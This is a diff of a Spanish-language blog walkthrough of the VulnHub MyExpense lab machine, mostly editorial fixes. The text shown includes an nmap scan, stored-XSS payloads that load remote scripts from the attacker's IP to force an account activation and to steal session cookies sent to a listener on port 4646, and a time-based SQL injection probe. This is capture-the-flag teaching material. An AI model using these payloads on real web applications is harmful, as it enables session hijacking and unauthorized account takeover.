@@ -18,29 +18,31 @@ tags:
   - hijacking
   - linux
 ---
-![](/assets/images/vh-writeup-myexpense/portada-myexpense.png)
 
-MyExpense es una máquina linux de [VulnHub](https://www.vulnhub.com/entry/myexpense-1,405/#top) y a diferencia de las máquinas de [HackTheBox](https://www.hackthebox.com/), su finalidad no la de llegar a ser root en el servidor comprometido.
+MyExpense es una máquina linux de [VulnHub](https://www.vulnhub.com/entry/myexpense-1,405/#top) y a diferencia de las máquinas de [HackTheBox](https://www.hackthebox.com/), su finalidad no es la de llegar a ser root en el servidor comprometido.
 
-En este caso, somos un "Samuel Lamotte", exempleado de una empresa la cual nos ha despedido y encima, no nos han tramitado un pago que nos deben. Nuestro objetivo será infiltrarnos en el sistema para que el pago se lleve a cabo.
+En este caso, somos un "Samuel Lamotte", ex-empleado de una empresa la cual nos ha despedido y encima, no nos han tramitado un pago que nos deben. Nuestro objetivo será infiltrarnos en el sistema para que el pago se lleve a cabo.
 
 La única pista que nos dan es: ```samuel/fzghn4lw```, lo cual parecen unas credenciales.
 
 ## Índice
-* [Fase de reconocimiento](#reconocimiento)
-  * [Reconociento de puertos y servicios](#reconocimiento)
-  * [Reconocimiento de la página web](#reconocimiento-web)
-* [Fase de explotación](#explotacion)
-  * [Nos logeamos como slamotte](#slamotte)
-  * [Convirtiéndonos en mriviere](#mriviere)
-  * [Convirtiéndonos en pbaudouin](#pbaudouin)
+- [Índice](#índice)
+- [Fase de reconocimiento](#fase-de-reconocimiento)
+  - [Reconocimiento de puertos y servicios](#reconocimiento-de-puertos-y-servicios)
+  - [Reconocimiento web](#reconocimiento-web)
+- [Fase de explotación](#fase-de-explotación)
+  - [Nos logeamos como en slamotte](#nos-logeamos-como-en-slamotte)
+  - [Nos convertimos en mriviere](#nos-convertimos-en-mriviere)
+  - [Nos convertimos en pbaudouin](#nos-convertimos-en-pbaudouin)
 
 <a id="reconocimiento"></a>
 ## Fase de reconocimiento
 
+>Mientras hacía la máquina tuve que reiniciarla, así que en este post, la máquina atacante tendrá dos Ips: 10.0.2.9 y 10.0.2.10
+
 ### Reconocimiento de puertos y servicios
 
-Empezaremos utilizando nmap para descubrir los puertos abiertos accesibles(digo accesibles ya que la máquina puede tener más puertos abiertos pero que solo son accesibles desde la misma).
+Empezaremos utilizando nmap para descubrir los puertos abiertos accesibles.
 ```bash
 nmap -p- --open -sS --min-rate 5000 -Pn -n -v 10.0.2.9 -oG allPort
 ```
@@ -97,25 +99,25 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Mon Oct 23 18:04:23 2023 -- 1 IP address (1 host up) scanned in 7.26 seconds
 ```
 
-Como podemos ver, el servidor tiene el puerto 80 con el servicio *http*. Es más, ha encontrado una ruta llamada ```/admin/admin```.php que tiene una cookie de *PHPSESSION* que tiene el http-only deshabilitado.
+Como podemos ver, el servidor tiene el puerto 80 con el servicio *http*. Es más, existe una ruta llamada ```/admin/admin.php``` que tiene una cookie de *PHPSESSION* que tiene la flag http-only deshabilitada.
 
 Esta flag puede ser crucial si se produce un [XSS (Cross Site Scripting)](https://owasp.org/www-community/attacks/xss/), ya que nos puede permitir hacer un [Session Hijacking](https://en.wikipedia.org/wiki/Session_hijacking).
 
 
 <a id="reconocimiento-web"></a>
-### Reconocimiento de la página web
+### Reconocimiento web
 
-Podemos acceder a la página ```/admin/admin.php``` sin logearnos en la página y podemos ver una serie de usuario y si están activos o no.
+Podemos acceder a la página ```/admin/admin.php``` sin logearnos y podemos ver una serie de usuarios.
 
 <a id="explotacion"></a>
 
 ## Fase de explotación
 
-Entre estos usuarios podemos ver al nuestro: slamotte. Sin embargo, si intentamos logearnos nos dice que no podemos entrar en esta porque está inactiva.
+Entre estos usuarios podemos ver al nuestro: slamotte. Sin embargo, si intentamos logearnos nos dice que no podemos entrar en esta porque la cuenta está inactiva.
 
 Por lo tanto intentamos crear una nueva, pero por defecto aparece inactiva.
 
-Como el login nos permite escribir un input que luego se refleja en ```/admin/admin.php```, intentamos probar un **XSS**. Creamos un usuario con el FirstName: ```<marquee>Hacked</marquee>```. Cuando vamos a *admin.php* podemos ver que se mueve el texto. Por lo tanto, estamos ante un **XSS**.
+Como el login nos permite escribir un input(el FirstName y el LastName) que luego se refleja en ```/admin/admin.php```, intentamos probar un **XSS**. Creamos un usuario con el FirstName: ```<marquee>Hacked</marquee>```. Cuando vamos a *admin.php* podemos ver que se mueve el texto. Por lo tanto, estamos ante un **XSS**.
 
 Si le damos a activar una cuenta, nos redirigirá a una página diciendo que no tenemos privilegios para hacerlo. Esta petición se hace por *GET* y podemos ver en la URL que se tramita de la siguiente manera: 
 ```
@@ -128,7 +130,7 @@ El campo id es el id del usuario al que queremos activar y el status es al estad
 
 Si logramos que el administrador realice esta petición activará la cuenta. Esto lo podremos conseguir derivando el **XSS** anterior en un [CSRF(Cross Site Request Forgery)](https://owasp.org/www-community/attacks/csrf).
 
-La idea es que vamos a hacer que el administrador cargue un código malicioso *js* gracias al **XSS**. Este script va a realizar una petición XML a la URL de activarnos la cuenta con suerte de que la ejecute un administrador.
+La idea es que vamos a hacer que el administrador cargue un código malicioso *js* gracias al **XSS**. Este script va a realizar una petición XML a la URL de activarnos la cuenta.
 
 pwned.js:
 
@@ -143,7 +145,7 @@ Ahora creamos un usuario con el siguiente FirstName:
 <script src="http://<mi ip>/pwned.js"></script>
 ```
 
-Iniciamos un servicio *http* en la carpeta en la que tenemos el archivo. Yo lo hago con python desde consola de la siguiente manera:
+Iniciamos un servicio *http* con el puerto 80 en la carpeta en la que tenemos el archivo. Yo lo hago con python desde consola de la siguiente manera:
 ```py
 python -m http.server 80
 ```
@@ -161,7 +163,7 @@ Si nos vamos al apartado del perfil, podemos ver quién es nuestro mánager: Man
 Si alguien tiene que tramitar nuestro pago, por lógica tiene que ser él. Por lo tanto tenemos que ver la forma de que nos acepte el pago.
 
 <a id="mriviere"></a>
-### Convirtiéndonos en mriviere
+### Nos convertimos en mriviere
 
 Si intentamos inyectar html en el chat, podremos observar que se produce un *XSS*. La idea aquí será robar las cookie de sesión de la persona que vea el mensaje y probar suerte de que mriviere caiga en nuestra trampa.
 
@@ -170,6 +172,9 @@ Para ello referenciaré un script en *js* llamado ```stealCookie.js```:
 ```html
 <script src="http://<mi ip>/stealCookie.js"></script>
 ```
+
+![](/assets/images/vh-writeup-myexpense/messageStealCookie.png)
+
 
 stealCookie.js:
 ```js
@@ -182,11 +187,18 @@ En este código, se tramita una petición *GET* a nuestra ip con un parámetro l
 
 > Como se puede observar, esta vez uso el puerto 4646. Esto se debe a que el usuario administrador que visita continuamente a la página ```admin/admin.php``` que nos activó la cuenta de slamotte está continuamente haciendo una petición a nuestro puerto 80. Así que por simplificación usaremos otro puerto.
 
+Iniciamos un servicio *http* con el puerto 4646 en la carpeta en la que tenemos el archivo y esperamos las respuestas:
+```py
+python -m http.server 4646
+```
+
 Una vez hecho esto, obtendremos una serie de cookies de diferentes usuarios. Iremos probando una a una hasta dar con **mriviere**.
 
 ![](/assets/images/vh-writeup-myexpense/mriviereReport.png)
 
-Aquí podemos ver la petición del pago y le damos a aceptar. Pero esto no es suficiente, todavía lo tiene que revisar el superior de este usuario. Si nos vamos a su usuario lo encontraremos:
+Aquí podemos ver la petición del pago y le damos a aceptar. 
+
+Pero esto no es suficiente, todavía lo tiene que revisar el superior de este usuario. Si nos vamos a su usuario lo encontraremos:
 
 ![](/assets/images/vh-writeup-myexpense/whoisManagerOfManager.png)
 
@@ -195,7 +207,7 @@ En las cookies anteriores se encuentra este usuario. Sin embargo, como es un adm
 ![](/assets/images/vh-writeup-myexpense/mgmNoMeDeja.png)
 
 <a id="pbaudouin"></a>
-### Convirtiéndonos en pbaudouin
+### Nos convertimos en pbaudouin
 
 Si nos vamos al apartado *Rennes*, podremos ver una lista de elmentos. Si nos fijamos en la url, hay un parámetro llamado **id**. Podemos intentar probar un [SQLI (SQL Injection)](https://portswigger.net/web-security/sql-injection) escribiendo ```?id=2 or sleep(5)``` podremos observar como la página se queda cargando durante un buen rato así que podemos decir que funciona.
 
